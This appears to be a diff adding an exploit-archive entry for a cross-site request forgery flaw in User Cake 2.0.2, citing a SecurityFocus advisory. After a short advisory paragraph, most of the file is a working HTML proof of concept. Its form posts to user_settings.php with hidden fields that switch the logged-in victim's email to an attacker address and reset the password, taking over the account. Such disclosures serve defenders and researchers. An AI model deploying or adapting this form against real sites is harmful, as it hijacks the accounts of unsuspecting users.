@@ -1,0 +1,37 @@
+source: http://www.securityfocus.com/bid/67604/info
+
+User Cake is prone to a cross-site request-forgery vulnerability because it does not properly validate HTTP requests.
+
+An attacker can exploit this issue to perform unauthorized actions in the context of a logged-in user of the affected application. This may aid in other attacks.
+
+User Cake 2.0.2 is vulnerable; prior versions may also be affected. 
+
+<html>
+<! -- CSRF Example for userCake -->
+<div align="center">
+<pre>
+
+<h2><b>  		       userCake CSRF Proof of concept  			<b></h2>
+
+<h4> Prerequisite: Make sure the user is logged in to the forum before submitting </h4>
+<body>
+<form
+action="http://usercake.com/user_settings.php"
+method="POST">
+Enter <u>CSRFTest</u> user account password to continue...
+
+
+ Username:   <b>CSRFTest</b>
+   Password: <input type="password" name="password" size="10" required>
+<input type="hidden" name="email" value="attacker@email.com" />
+<input type="hidden" name="passwordc" value="HelloWorld" />
+<input type="hidden" name="passwordcheck" value="HelloWorld" />
+<input type="submit" name="submit" value="Submit" />
+
+
+
+	</form>
+	</body>
+
+</div>
+</html>
